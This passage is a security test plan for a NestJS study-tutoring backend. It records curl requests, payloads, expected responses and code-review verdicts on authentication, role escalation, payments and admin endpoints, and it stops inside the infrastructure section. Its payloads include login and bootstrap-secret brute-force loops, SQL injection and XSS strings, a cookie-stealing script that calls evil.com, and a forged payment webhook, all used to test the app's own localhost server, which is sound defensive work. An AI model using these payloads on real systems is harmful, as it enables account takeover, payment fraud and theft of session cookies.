# BRUTAL BACKEND TEST CASES
### Study App — NestJS + Prisma + Supabase (PostgreSQL)
> **Methodology:** Black-box + white-box hybrid. Every test section states **what we probe**, **why it matters**, **exact payload/request**, **expected result**, and **current verdict** based on code review.
> 
> **Scope:** Local server (`http://localhost:3000`). No actual Supabase writes during security-probing — tests marked `🔴 NO-DB` are pure HTTP/payload tests. Tests marked `🟡 DB-NEEDED` require a running local database.
> 
> **Severity scale:** `CRITICAL` → `HIGH` → `MEDIUM` → `LOW` → `INFO`

---

## Table of Contents
1. [Authentication](#1-authentication)
2. [Authorization & Role Guard](#2-authorization--role-guard)
3. [Privilege Escalation](#3-privilege-escalation)
4. [User / Profile Module](#4-user--profile-module)
5. [Booking Module](#5-booking-module)
6. [Coins & Payment Module](#6-coins--payment-module)
7. [Admin Module](#7-admin-module)
8. [Messages Module](#8-messages-module)
9. [Reviews Module](#9-reviews-module)
10. [Internal Cron Endpoints](#10-internal-cron-endpoints)
11. [Infrastructure & Global](#11-infrastructure--global)
12. [Race Conditions & Concurrency](#12-race-conditions--concurrency)
13. [Business Logic Abuse](#13-business-logic-abuse)
14. [Data Enumeration & Exfiltration](#14-data-enumeration--exfiltration)
15. [Known Vulnerabilities Summary](#15-known-vulnerabilities-summary)

---

## 1. Authentication

### Method
- Manual HTTP requests (curl/Postman)
- JWT decode/tamper (jwt.io)
- Password brute-force simulation
- Timing side-channel measurement

---

### TC-AUTH-001 — Valid login returns JWT `🟡 DB-NEEDED`
**Endpoint:** `POST /auth/login`
```json
{ "email": "student@test.com", "password": "validpassword" }
```
**Expected:** `200`, `access_token` present, `user.role` matches DB.  
**Pass criteria:** Token decodes to correct `sub` (user UUID).

---

### TC-AUTH-002 — Wrong password still returns vague message `🟡 DB-NEEDED`
```json
{ "email": "student@test.com", "password": "wrongpass" }
```
**Expected:** `401 "Invalid email or password."` — same message as unknown email.  
**Why:** User enumeration prevention. If error differs between "bad pass" vs "unknown email", attacker can enumerate valid emails.  
**Current code:** Both paths throw identical `UnauthorizedException('Invalid email or password.')`. ✅ Correct.

---

### TC-AUTH-003 — User enumeration via timing `🔴 NO-DB`
**Method:** Measure response time for:
- `POST /auth/login` with known-good email + wrong password → argon2 runs (~200ms)
- `POST /auth/login` with nonexistent email + wrong password → argon2 SKIPPED, fast path

```bash
time curl -s -X POST localhost:3000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"nobody@nowhere.com","password":"x"}'

time curl -s -X POST localhost:3000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"known@user.com","password":"wrongpassword"}'
```
**Expected:** Both responses take ~same time.  
**Current code:** When user not found, argon2 is NOT called — instant `throw`. When user found, argon2 runs (~200ms). **Timing leak confirms email exists.** `MEDIUM`

---

### TC-AUTH-004 — No rate limiting on login `🔴 NO-DB`
```bash
for i in {1..100}; do
  curl -s -X POST localhost:3000/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email":"victim@test.com","password":"guess'$i'"}' &
done
wait
```
**Expected:** After N failed attempts, lockout or rate-limit `429`.  
**Current code:** No rate-limiting middleware in `main.ts`. No lockout logic in `auth.service.ts`. **100% of requests proceed.** `HIGH`  
**Fix:** Add `@nestjs/throttler` with `ThrottlerGuard` on auth endpoints. Or Helmet + express-rate-limit.

---

### TC-AUTH-005 — `dev-token` endpoint bypasses all auth `🔴 NO-DB`
```bash
# Only works when NODE_ENV != 'production'
curl "localhost:3000/auth/dev-token?email=admin@studyapp.com"
```
**Expected in prod:** `403 Forbidden`.  
**Expected in dev/staging:** Returns real JWT for ANY email without password.  
**Risk:** If this endpoint ever ships to staging, anyone who knows an email (enumerated via TC-014) gets full account access. `HIGH`  
**See also:** Memory note warns to remove before demo.

---

### TC-AUTH-006 — JWT tampered signature `🔴 NO-DB`
**Method:** Take any valid JWT, decode it, change `role` to `ADMIN`, re-sign with wrong secret, send as Bearer token.
```bash
# Tampered token (invalid signature)
curl localhost:3000/auth/me \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.TAMPERED_PAYLOAD.FAKE_SIG"
```
**Expected:** `401 Unauthorized`.  
**Current code:** `passport-jwt` verifies signature. ✅ Correct.

---

### TC-AUTH-007 — Expired JWT still accepted? `🔴 NO-DB`
Check `ignoreExpiration` in `jwt.strategy.ts`.  
**Current code:** `ignoreExpiration: false`. ✅ Correct.  
**But:** No token revocation (no blacklist). If a token is stolen before expiry, it remains valid until expiry.  
**Test:** Issue token, note expiry, try using it after expiry. `INFO`

---

### TC-AUTH-008 — Admin login with student account `🟡 DB-NEEDED`
```json
{ "admin_id": "any-admin-id", "password": "studentpassword" }
```
**Expected:** `401` — code checks `user.role !== 'ADMIN'`.  
**Current code:** ✅ Correctly rejects non-ADMIN roles.

---

### TC-AUTH-009 — Google auth with forged `idToken` `🔴 NO-DB`
```json
{ "idToken": "eyFAKETOKEN", "role": "STUDENT" }
```
**Expected:** `401 "Failed to authenticate with Google."`.  
**Current code:** Calls `googleClient.verifyIdToken()` which validates against Google. ✅ Correct.  
**Edge:** If `GOOGLE_CLIENT_ID` is undefined, verification still runs but audience check might be weak. `LOW`

---

### TC-AUTH-010 — Google auth role injection `🔴 NO-DB`
```json
{ "idToken": "<valid_google_token>", "role": "ADMIN" }
```
**Expected:** User created/logged in, but role should NOT be ADMIN.  
**Current code:** `role: role.toUpperCase()` — no validation on allowed roles. An attacker with a valid Google token can set `role: "ADMIN"`. `HIGH`  
**But:** ADMIN accounts have no email field used for lookups normally; risk is conditional on downstream checks.

---

### TC-AUTH-011 — Signup with `ADMIN` role `🔴 NO-DB`
```json
{ "email": "fake@admin.com", "password": "password123", "role": "ADMIN" }
```
**Expected:** `400` — `@IsIn(['STUDENT', 'TUTOR', 'student', 'tutor'])` in `SignUpDto` rejects `ADMIN`.  
**Current code:** ✅ DTO validation blocks it.

---

### TC-AUTH-012 — Password too short `🔴 NO-DB`
```json
{ "email": "test@test.com", "password": "abc", "role": "STUDENT" }
```
**Expected:** `400 Bad Request`, validation error for `password` (MinLength 8).  
**Current code:** ✅ Class-validator handles this.

---

### TC-AUTH-013 — Invalid email format `🔴 NO-DB`
```json
{ "email": "notanemail", "password": "password123" }
```
**Expected:** `400` with validation error.  
**Current code:** `@IsEmail()` in `SignUpDto`. ✅

---

### TC-AUTH-014 — Empty body `🔴 NO-DB`
```bash
curl -X POST localhost:3000/auth/login \
  -H "Content-Type: application/json" \
  -d '{}'
```
**Expected:** `400` validation error for required fields.  
**Current code:** ✅ `ValidationPipe` with `whitelist: true`.

---

## 2. Authorization & Role Guard

### Method
- Send requests without JWT
- Send requests with STUDENT JWT to ADMIN endpoints
- Verify `RolesGuard` actually fires

---

### TC-AUTHZ-001 — Unauthenticated access to protected endpoint `🔴 NO-DB`
```bash
curl localhost:3000/booking/student
```
**Expected:** `401 Unauthorized`.  
**Current code:** `@UseGuards(AuthGuard('jwt'))` on booking controller. ✅

---

### TC-AUTHZ-002 — STUDENT JWT accessing ADMIN endpoints `🔴 NO-DB`
```bash
curl localhost:3000/admin/stats \
  -H "Authorization: Bearer <student_token>"
```
**Expected:** `403 Forbidden` from `RolesGuard`.  
**Current code:** `@Roles('ADMIN')` + `RolesGuard`. ✅

---

### TC-AUTHZ-003 — `POST /admin/create` has NO auth guard `🔴 NO-DB` **CRITICAL**
```bash
curl -X POST localhost:3000/admin/create \
  -H "Content-Type: application/json" \
  -d '{"full_name":"Evil Admin","password":"hacked123","bootstrap_secret":"GUESS_ME"}'
```
**Current code:**
```typescript
// No @UseGuards decorator here!
@Post('create')
createAdmin(@Request() req: any, @Body() dto: CreateAdminDto) {
  const callerRole = req.user?.role; // undefined when no JWT!
  return this.adminService.createAdmin(callerRole, dto);
}
```
**Attack:** `req.user` is `undefined` without JWT. Service checks:
```typescript
const usingBootstrap = dto.bootstrap_secret && bootstrapSecret && dto.bootstrap_secret === bootstrapSecret;
if (!usingBootstrap && callerRole !== 'ADMIN') throw ForbiddenException(...)
```
So attacker needs to know/guess `ADMIN_BOOTSTRAP_SECRET`. But see TC-ADMIN-002 for timing attack.  
**Severity:** `HIGH` — single env-var secret protects the entire admin creation path.

---

### TC-AUTHZ-004 — Banned user JWT still accepted until expiry? `🟡 DB-NEEDED`
1. Admin bans user. Set `is_banned = true` in DB.
2. User's existing JWT (before ban) still sent.
3. `JwtStrategy.validate()` checks `user.is_banned` on every request.
```typescript
if (user.is_banned) throw new ForbiddenException('Account permanently banned.');
```
**Expected:** `403` on next request after ban. ✅ Correct — DB check on every request prevents stale-JWT bypass.

---

### TC-AUTHZ-005 — JWT with role in payload vs actual DB role `🟡 DB-NEEDED`
**Setup:** User is STUDENT. Gets token with `role: STUDENT` in payload.  
**Attack:** Manually craft JWT with `role: ADMIN` signed with correct secret (requires knowing `JWT_SECRET`).  
**Expected:** `403` — `JwtStrategy.validate()` returns `payload.role` from token, NOT from DB re-fetch. `RolesGuard` checks token role.  
**Current code flaw:** Role in JWT is trusted without re-fetching from DB. If a user's role changes (e.g., via TC-PRIV-001 escalation), old tokens still carry old role. **But also: if attacker knows `JWT_SECRET`, they can forge any role.** `HIGH`  
**Fix:** Fetch role from DB in `JwtStrategy.validate()` instead of trusting token payload.

---

## 3. Privilege Escalation

### TC-PRIV-001 — Self role escalation via profile update `🟡 DB-NEEDED` **CRITICAL**
**Endpoint:** `PATCH /user/update/profile`  
**Auth:** Any authenticated STUDENT

```bash
curl -X PATCH localhost:3000/user/update/profile \
  -H "Authorization: Bearer <student_token>" \
  -H "Content-Type: application/json" \
  -d '{"role": "TUTOR"}'
```

**`UpdateProfileDTO`:**
```typescript
@IsOptional()
@IsIn(['STUDENT', 'TUTOR', 'student', 'tutor'])
role?: string;
```

**`user.service.ts`:**
```typescript
...(data.role && { role: data.role.toUpperCase() }),
```

**Expected:** Request rejected — users should not change their own role.  
**Actual:** Any authenticated user can promote themselves to TUTOR. `CRITICAL`  
**Why it matters:** TUTOR accounts can create offers, receive coins from bookings, request withdrawals. A student who self-promotes to TUTOR bypasses the verification requirement and earns real money.

---

### TC-PRIV-002 — TUTOR cannot escalate to ADMIN via profile update `🟡 DB-NEEDED`
```bash
curl -X PATCH localhost:3000/user/update/profile \
  -H "Authorization: Bearer <student_token>" \
  -H "Content-Type: application/json" \
  -d '{"role": "ADMIN"}'
```
**Expected:** `400` — `@IsIn(['STUDENT', 'TUTOR', 'student', 'tutor'])` blocks ADMIN.  
**Current code:** ✅ DTO blocks ADMIN role. But still lets STUDENT→TUTOR (TC-PRIV-001).

---

### TC-PRIV-003 — Google auth sets arbitrary role `🟡 DB-NEEDED`
**Already covered in TC-AUTH-010.** A valid Google token + `role: "TUTOR"` creates a TUTOR account without any verification step. The account still goes through `verification_status: 'PENDING'`, but coin earnings flow to unverified tutors.

---

## 4. User / Profile Module

### TC-USER-001 — Unauthenticated student listing `🟡 DB-NEEDED`
```bash
curl localhost:3000/user/student
```
**Expected:** Requires auth. Attacker does NOT need a token.  
**Current code:** No `@UseGuards` on `GET /user/student`. Returns `id, full_name, username, avatar_url, bio, student_rating` for ALL students.  
**Severity:** `MEDIUM` — full student roster enumerable without auth.

---

### TC-USER-002 — Public tutor listing reveals penalized tutors' internal data `🟡 DB-NEEDED`
`GET /user/tutors/all` calls `getAllTutorProfile()` which fetches `penalty_until`, `penalty_rating_knock`, `penalty_price_pct`, then calls `applyPenalty()` which strips those fields before returning.  
**Test:** Verify response does NOT contain `penalty_until`, `penalty_rating_knock`, `penalty_price_pct`.  
**Current code:** ✅ `applyPenalty()` destructures them out.

---

### TC-USER-003 — No pagination on bulk listing endpoints `🟡 DB-NEEDED`
```bash
curl localhost:3000/user/tutors/all
curl localhost:3000/user/student
```
**Current code:** `getAllTutorProfile()` / `getAllStudentProfile()` have no `take` or `skip`. With 10,000 users, these return entire table in one response.  
**Severity:** `MEDIUM` — DoS via DB-exhaustion on large datasets.

---

### TC-USER-004 — Search injection via query params `🔴 NO-DB`
```bash
curl "localhost:3000/user/tutors?search=%27%20OR%201%3D1--"
curl "localhost:3000/user/tutors?search='; DROP TABLE profiles;--"
```
**Expected:** Safe — Prisma uses parameterized queries.  
**Current code:** `{ full_name: { contains: searchQuery, mode: 'insensitive' } }` — Prisma ORM prevents SQL injection. ✅

---

### TC-USER-005 — Update another user's profile (IDOR) `🟡 DB-NEEDED`
`PATCH /user/update/profile` uses `userId` from JWT — not from request body.  
**Test:** Can user A modify user B's profile?  
**Current code:** Extracts `userId` from `req.user`, not from body. ✅ No IDOR here.  
**But:** Combined with TC-PRIV-001, own-profile role escalation is still wide open.

---

### TC-USER-006 — XSS payload in bio/full_name `🔴 NO-DB`
```bash
curl -X PATCH localhost:3000/user/update/profile \
  -H "Authorization: Bearer <student_token>" \
  -H "Content-Type: application/json" \
  -d '{"bio":"<script>document.cookie</script>","full_name":"<img src=x onerror=alert(1)>"}'
```
**Expected:** Stored in DB as-is (backend has no HTML sanitizer).  
**Risk:** If frontend renders these fields as `innerHTML`, stored XSS fires for every user who views the profile. `HIGH` (frontend-dependent).  
**Fix:** Sanitize on input or escape on output. Backend currently does neither.

---

### TC-USER-007 — Extremely long input fields `🔴 NO-DB`
```bash
# bio is capped at MaxLength(500), but what about subjects?
curl -X PATCH localhost:3000/user/update/profile \
  -H "Authorization: Bearer <student_token>" \
  -H "Content-Type: application/json" \
  -d '{"subjects":["x".repeat(10000),"y".repeat(10000),...1000 items]}'
```
**Expected:** `400` or capped gracefully.  
**Current code:** `subjects: string[]` — no max array length, no max string length per item. Unbounded array stored in Postgres. `MEDIUM`

---

### TC-USER-008 — Availability slot boundary: end before start `🔴 NO-DB`
```json
{ "available_from": "2099-01-01T10:00:00Z", "available_to": "2099-01-01T09:00:00Z", "timezone": "UTC" }
```
**Expected:** `400 "available_from must be before available_to."`.  
**Current code:** ✅ Checks `from >= to`.

---

### TC-USER-009 — Availability in the past `🔴 NO-DB`
```json
{ "available_from": "2000-01-01T00:00:00Z", "available_to": "2000-01-01T01:00:00Z", "timezone": "UTC" }
```
**Expected:** `400 "Cannot create availability slot in the past."`.  
**Current code:** ✅ Checks `from < new Date()`.

---

### TC-USER-010 — Student creates tutor availability slot `🟡 DB-NEEDED`
```bash
curl -X POST localhost:3000/user/tutor/availability \
  -H "Authorization: Bearer <student_token>" \
  -H "Content-Type: application/json" \
  -d '{"available_from":"2099-01-01T10:00:00Z","available_to":"2099-01-01T11:00:00Z","timezone":"UTC"}'
```
**Expected:** `403 "Only tutors can add availability slots."`.  
**Current code:** ✅ Role check in service.

---

## 5. Booking Module

### TC-BOOK-001 — Student books with zero balance `🟡 DB-NEEDED`
**Setup:** Student has 0 coins. Tutor's offer costs 30 coins/session.  
**Expected:** `400 "Insufficient coins."` before any DB write.  
**Test:** Verify no booking record created, no coin_transaction record, no negative balance.

---

### TC-BOOK-002 — Student books own tutor offer (self-booking) `🟡 DB-NEEDED`
**Setup:** User is both STUDENT and (after TC-PRIV-001 escalation) TUTOR.  
**Test:** Book themselves.  
**Check booking service:** Does it prevent `student_id === tutor_id`? Review `createBooking()` in booking service.

---

### TC-BOOK-003 — Double booking same slot `🟡 DB-NEEDED`
Send two identical booking requests simultaneously:
```bash
curl -X POST localhost:3000/booking -d '{"tutorOfferId":"<id>","startAt":"2099-01-15T10:00:00Z","availabilityId":"<slot_id>"}' &
curl -X POST localhost:3000/booking -d '{"tutorOfferId":"<id>","startAt":"2099-01-15T10:00:00Z","availabilityId":"<slot_id>"}' &
wait
```
**Expected:** Only one booking succeeds. Second returns `409` or `400`.  
**Risk:** No DB-level unique constraint on `tutor_availability_id` in `bookings` table schema means concurrent requests might both succeed before either is committed. `HIGH`

---

### TC-BOOK-004 — Booking past date `🔴 NO-DB`
```json
{ "tutorOfferId": "<id>", "startAt": "2000-01-01T00:00:00Z" }
```
**Expected:** `400` — session in the past.  
**Check:** Does `createBooking()` validate that `startAt > now`?

---

### TC-BOOK-005 — Access another user's booking (IDOR) `🟡 DB-NEEDED`
```bash
curl localhost:3000/booking/<other_users_booking_id> \
  -H "Authorization: Bearer <my_token>"
```
**Expected:** `403 Forbidden` or `404 Not Found`.  
**Current code:** `getBookingById()` should check `student_id === userId || tutor_id === userId`.

---

### TC-BOOK-006 — Tutor confirms booking they don't own `🟡 DB-NEEDED`
```bash
curl -X PATCH localhost:3000/booking/<other_tutors_booking_id>/confirm \
  -H "Authorization: Bearer <tutor_B_token>"
```
**Expected:** `403 Forbidden`.  
**Check:** Does confirm action verify `tutor_id === req.user.sub`?

---

### TC-BOOK-007 — Booking with negative duration `🔴 NO-DB`
```json
{ "tutorId": "<id>", "startAt": "2099-01-15T10:00:00Z", "endAt": "2099-01-15T09:00:00Z", "durationMinutes": -60 }
```
**Expected:** `400` — `@Min(15)` on `durationMinutes`. `endAt < startAt` should also be rejected.  
**Current code:** `@Min(15)` catches negative/tiny. ✅ But `endAt < startAt` needs service-level check.

---

### TC-BOOK-008 — Price proposal: student accepts expired proposal `🟡 DB-NEEDED`
**Setup:** Tutor proposes new price. Proposal expires (2 hours). Student tries to accept after expiry.  
**Expected:** `400` — proposal expired/cleared.  
**Check:** `acceptPriceProposal()` should check `price_proposal_expires_at > now`.

---

### TC-BOOK-009 — Jitsi room URL accessible by non-participant `🟡 DB-NEEDED`
```bash
curl localhost:3000/booking/<someone_elses_booking_id>/join \
  -H "Authorization: Bearer <random_user_token>"
```
**Expected:** `403 Forbidden`.  
**Risk:** If `getJoinInfo()` only checks auth (JWT valid) but not participation, any logged-in user gets the room URL + password.

---

### TC-BOOK-010 — Reschedule proposed by student (only tutor should propose) `🟡 DB-NEEDED`
```bash
curl -X PATCH localhost:3000/booking/<id>/propose-reschedule \
  -H "Authorization: Bearer <student_token>" \
  -d '{"proposed_start":"2099-02-01T10:00:00Z","proposed_end":"2099-02-01T11:00:00Z"}'
```
**Expected:** Check if the service restricts reschedule proposals to the tutor only.

---

## 6. Coins & Payment Module

### TC-COIN-001 — Webhook without signature (dev mode) `🔴 NO-DB` **CRITICAL**
**Condition:** `MIDTRANS_SERVER_KEY` not set in `.env` (dev/test/staging).  
```bash
curl -X POST localhost:3000/coins/webhook/midtrans \
  -H "Content-Type: application/json" \
  -d '{
    "order_id": "<any_pending_order_id>",
    "transaction_status": "settlement",
    "status_code": "200",
    "gross_amount": "50000",
    "signature_key": "doesnt_matter"
  }'
```
**Current code:**
```typescript
if (process.env.MIDTRANS_SERVER_KEY) {
  // signature check only runs if key is set
}
if (transaction_status === 'settlement') return this.fulfillOrder(order_id);
```
**Expected:** `401 "Invalid Midtrans signature."` always.  
**Actual:** When `MIDTRANS_SERVER_KEY` is unset, ANY request with `transaction_status: "settlement"` fulfills the order and credits coins to the account. No auth, no signature, no secret. `CRITICAL`

---

### TC-COIN-002 — `dev/fulfill` endpoint unauthenticated `🔴 NO-DB` **CRITICAL**
```bash
curl -X POST localhost:3000/coins/dev/fulfill/<any_order_id>
```
**Current code:**
```typescript
@Post('dev/fulfill/:orderId')
devFulfill(@Param('orderId') orderId: string) {
  if (process.env.MIDTRANS_SERVER_KEY) {
    return { message: 'Dev fulfill disabled in production.' }; // disabled only IF key is set
  }
  return this.coinsService.fulfillOrder(orderId); // runs when NO key set
}
```
**No `@UseGuards`**. No auth at all. Anyone with an order ID can credit coins to it. `CRITICAL`

---

### TC-COIN-003 — Webhook replay attack `🟡 DB-NEEDED`
Send the same valid Midtrans webhook twice (with valid signature if key is set).  
```bash
# Send webhook twice with same order_id + settlement
curl -X POST localhost:3000/coins/webhook/midtrans -d '<valid_payload>' &
curl -X POST localhost:3000/coins/webhook/midtrans -d '<valid_payload>' &
wait
```
**Expected:** Coins credited only once.  
**Current code:** `fulfillOrder()` checks `if (order.status === 'COMPLETED') return { message: 'Order already fulfilled.' }`. ✅ Idempotent.  
**BUT:** Two concurrent requests could both read `status === 'PENDING'` before either updates. Race condition. `MEDIUM`

---

### TC-COIN-004 — Purchase arbitrary coin amount `🔴 NO-DB`
```json
{ "coins_amount": 99999 }
```
**Expected:** `400 "Invalid coins_amount. Valid: 50, 120, 260, 550"`.  
**Current code:** `COIN_PACKAGES` whitelist + `@IsIn()` validator. ✅

---

### TC-COIN-005 — Withdrawal more than balance `🟡 DB-NEEDED`
```json
{ "coins_amount": 999999, "account_name": "...", "account_number": "...", "payment_method": "QRIS" }
```
**Expected:** `400 "Insufficient balance."`.  
**Current code:** Balance check exists. ✅  
**But see TC-RACE-002 for concurrent withdrawal race condition.**

---

### TC-COIN-006 — Student requests withdrawal `🟡 DB-NEEDED`
```bash
curl -X POST localhost:3000/coins/withdraw \
  -H "Authorization: Bearer <student_token>" \
  -d '{"coins_amount":10,"account_name":"x","account_number":"123"}'
```
**Expected:** `400 "Only tutors can request withdrawals."`.  
**Current code:** ✅ Role check in service.

---

### TC-COIN-007 — Negative Midtrans signature computation `🔴 NO-DB`
**Attack:** Send webhook with crafted `gross_amount: "-50000"` — does the signature still match with negative amounts?  
This tests whether sign computation handles non-standard values that might slip past signature but mutate fulfillment logic.

---

### TC-COIN-008 — Midtrans webhook with unknown `order_id` `🔴 NO-DB`
```json
{ "order_id": "nonexistent-uuid", "transaction_status": "settlement", ... }
```
**Expected:** `404 Not Found` from `fulfillOrder`.  
**Current code:** `fulfillOrder()` throws `NotFoundException`. ✅

---

### TC-COIN-009 — Coins balance goes negative via concurrent booking + withdrawal `🟡 DB-NEEDED`
**Attack sequence:**
1. Tutor earns exactly 50 coins.
2. Simultaneously fire: `POST /coins/withdraw 50 coins` AND book a session that costs tutor coins.
**Expected:** One of the two operations fails with insufficient balance.  
**Current code:** Withdrawal reads balance outside transaction (race). See TC-RACE-002.

---

## 7. Admin Module

### TC-ADMIN-001 — Bootstrap secret brute force `🔴 NO-DB` **HIGH**
```bash
for word in $(cat /usr/share/dict/words | head -10000); do
  result=$(curl -s -X POST localhost:3000/admin/create \
    -H "Content-Type: application/json" \
    -d "{\"full_name\":\"Attacker\",\"password\":\"P@ssw0rd!\",\"bootstrap_secret\":\"$word\"}")
  if echo "$result" | grep -q "Admin account created"; then
    echo "FOUND: $word"; break
  fi
done
```
**Expected:** Rate limiting stops this. There is none.  
**Current code:** No rate limit, no lockout. If `ADMIN_BOOTSTRAP_SECRET` is weak (e.g., in `.env.example`), brute force succeeds. `HIGH`

---

### TC-ADMIN-002 — Bootstrap secret timing attack `🔴 NO-DB`
```typescript
// admin.service.ts
const usingBootstrap = dto.bootstrap_secret && bootstrapSecret && dto.bootstrap_secret === bootstrapSecret;
```
`===` string comparison is NOT constant-time. Attacker measures response times character by character to deduce the secret. Use `crypto.timingSafeEqual()` for secret comparison.  
**Severity:** `MEDIUM`

---

### TC-ADMIN-003 — Admin grants coins to themselves `🟡 DB-NEEDED`
```bash
curl -X POST localhost:3000/admin/users/<admin_own_id>/grant-coins \
  -H "Authorization: Bearer <admin_token>" \
  -d '{"coins": 99999, "reason": "test"}'
```
**Expected:** Allowed (admin can grant to anyone) or blocked with self-grant restriction.  
**Current code:** No self-grant restriction. Admin can grant themselves unlimited coins. `MEDIUM`

---

### TC-ADMIN-004 — Admin can change any user's role via admin update `🟡 DB-NEEDED`
Check if any admin endpoint allows arbitrary role updates — if so, verify it can't be called by non-admins.

---

### TC-ADMIN-005 — Admin stats endpoint data leakage `🟡 DB-NEEDED`
```bash
curl localhost:3000/admin/stats -H "Authorization: Bearer <admin_token>"
```
**Expected:** Aggregate stats only. No PII, no raw passwords, no encrypted fields.

---

### TC-ADMIN-006 — Admin `GET /admin/users` page/limit abuse `🔴 NO-DB`
```bash
curl "localhost:3000/admin/users?page=1&limit=999999" \
  -H "Authorization: Bearer <admin_token>"
```
**Expected:** Capped at sane limit.  
**Current code:** `limit ? parseInt(limit, 10) : 20` — no max cap. With limit=999999, returns entire user table. `MEDIUM`

---

## 8. Messages Module

### TC-MSG-001 — Message to self `🟡 DB-NEEDED`
```json
{ "to_id": "<own_user_id>", "content": "hello me" }
```
**Expected:** `400 "Cannot message yourself."`.  
**Current code:** ✅ Check exists in `sendMessage()`.

---

### TC-MSG-002 — Message to nonexistent user `🟡 DB-NEEDED`
```json
{ "to_id": "00000000-0000-0000-0000-000000000000", "content": "hello" }
```
**Expected:** `404 "Recipient not found."`.  
**Current code:** ✅ Recipient lookup before create.

---

### TC-MSG-003 — Read another user's conversation (IDOR) `🟡 DB-NEEDED`
```bash
curl localhost:3000/messages/conversation/<victim_user_id> \
  -H "Authorization: Bearer <attacker_token>"
```
**Expected:** Returns only messages between attacker and victim (not victim's conversation with third parties).  
**Current code:** Query filters `from_id = userId OR to_id = userId`. ✅  
**But:** This technically returns the conversation — it's how it's designed. Attacker can message victim to access the thread.

---

### TC-MSG-004 — Enormous message content `🔴 NO-DB`
```json
{ "to_id": "<valid_id>", "content": "A".repeat(1000000) }
```
**Expected:** `400` — content too long. DB column might accept it (no max in schema shown), but should be limited.  
**Current code:** No `@MaxLength` on `SendMessageDto.content`. `MEDIUM`

---

### TC-MSG-005 — XSS in message content `🔴 NO-DB`
```json
{ "to_id": "<valid_id>", "content": "<script>fetch('https://evil.com?c='+document.cookie)</script>" }
```
**Expected:** Stored as literal string. Frontend must escape when rendering.  
**Backend current code:** No sanitization. `HIGH` (frontend-dependent).

---

### TC-MSG-006 — Read receipts for other users' messages `🟡 DB-NEEDED`
```bash
curl -X PATCH localhost:3000/messages/<other_users_msg_id>/read \
  -H "Authorization: Bearer <attacker_token>"
```
**Expected:** `403 Forbidden` — only recipient can mark as read.  
**Check:** Does `markRead()` verify `to_id === userId`?

---

### TC-MSG-007 — Cursor-based pagination abuse `🔴 NO-DB`
```bash
curl "localhost:3000/messages/conversation/<id>?limit=999999" \
  -H "Authorization: Bearer <token>"
```
**Expected:** Capped at sane limit.  
**Current code:** `take: limit ?? 30`. No max cap on limit param. `MEDIUM`

---

## 9. Reviews Module

### TC-REV-001 — Review before session completes `🟡 DB-NEEDED`
```json
{ "booking_id": "<pending_booking_id>", "rating": 5, "comment": "great" }
```
**Expected:** `400 "Can only review a completed session."`.  
**Current code:** ✅ Status check.

---

### TC-REV-002 — Duplicate review same booking `🟡 DB-NEEDED`
Submit same review twice for same booking.  
**Expected:** `400 "You already reviewed this session."`.  
**Current code:** ✅ Duplicate check.

---

### TC-REV-003 — Tutor reviews their own session (IDOR) `🟡 DB-NEEDED`
```bash
curl -X POST localhost:3000/booking/<booking_id>/review \
  -H "Authorization: Bearer <tutor_token>" \
  -d '{"rating": 5, "comment": "I am great"}'
```
**Expected:** `403 "Only the student of this booking can leave a review."`.  
**Current code:** ✅ `booking.student_id !== reviewerId` check.

---

### TC-REV-004 — Review booking that belongs to someone else `🟡 DB-NEEDED`
Student A tries to review Student B's completed booking.  
**Expected:** `403 Forbidden`.  
**Current code:** ✅ `student_id !== reviewerId` check.

---

### TC-REV-005 — Rating boundary testing `🔴 NO-DB`
```json
{ "booking_id": "<id>", "rating": 0 }
{ "booking_id": "<id>", "rating": 6 }
{ "booking_id": "<id>", "rating": -1 }
{ "booking_id": "<id>", "rating": 999 }
{ "booking_id": "<id>", "rating": 1.5 }
```
**Expected:** All except `rating: 1-5 integer` return `400`.  
**Check:** What does `CreateReviewDto` allow? Verify `@Min(1) @Max(5) @IsInt()` present.

---

### TC-REV-006 — Rating manipulation via concurrent reviews `🟡 DB-NEEDED`
Rapidly submit 100 reviews for same tutor from 100 student accounts simultaneously.  
**Expected:** `overall_rating` is computed correctly via aggregate.  
**Current code:** Uses `prisma.reviews.aggregate({ _avg: rating })` after each review. Under concurrency, multiple reviews might trigger the aggregate at same time — last write wins. Potential for stale `overall_rating`. `LOW`

---

## 10. Internal Cron Endpoints

### TC-CRON-001 — No secret header `🔴 NO-DB`
```bash
curl localhost:3000/internal/notify-upcoming-sessions
curl localhost:3000/internal/process-expirations
```
**Expected:** `403 Forbidden`.  
**Current code:** `checkSecret()` compares `x-internal-secret` header. ✅  
**But:** Uses `===` string comparison (not constant-time). See TC-CRON-003.

---

### TC-CRON-002 — Wrong secret `🔴 NO-DB`
```bash
curl localhost:3000/internal/notify-upcoming-sessions \
  -H "x-internal-secret: wrongsecret"
```
**Expected:** `403 Forbidden`.  
**Current code:** ✅

---

### TC-CRON-003 — Timing attack on `INTERNAL_SECRET` `🔴 NO-DB`
```typescript
private checkSecret(secret: string) {
  if (secret !== process.env.INTERNAL_SECRET) throw new ForbiddenException(...)
}
```
`!==` comparison leaks timing. Measure response time while varying the first character — correct character takes microseconds longer.  
**Fix:** `crypto.timingSafeEqual(Buffer.from(secret), Buffer.from(process.env.INTERNAL_SECRET!))`.  
**Severity:** `LOW` (only exploitable if attacker has network access and can measure μs-level timing)

---

### TC-CRON-004 — Trigger expiration manually for financial gain `🟡 DB-NEEDED`
If attacker has `INTERNAL_SECRET`, they can call `process-expirations` at will:
1. Create a booking, don't confirm.
2. Call `/internal/process-expirations` — refunds coins immediately instead of waiting 1 hour.
3. Loop: create booking, trigger expiry, get coins refunded, repeat.  
**Expected:** Cron endpoint is network-restricted (Vercel cron IPs only) in production.  
**Risk:** In dev/staging without IP restriction, anyone with the secret can abuse refund flow.

---

### TC-CRON-005 — Session auto-complete triggers tutor coin payout `🟡 DB-NEEDED`
The `process-expirations` job auto-completes sessions that ended >2h ago and pays tutor coins.  
**Attack:** If tutor can manipulate `end_at` of a booking to be in the past (would require IDOR on booking update), auto-complete pays out without student confirmation.  
**Check:** No `end_at` update endpoint exposed. ✅ Booking `end_at` is set at creation and not updatable by user.

---

## 11. Infrastructure & Global

### TC-INFRA-001 — CORS allows all origins `🔴 NO-DB`
```typescript
app.enableCors(); // No config = allow all
```
```bash
curl localhost:3000/auth/me \
  -H "Origin: https://evil.com" \
  -H "Authorization: Bearer <token>" \
  -I
```
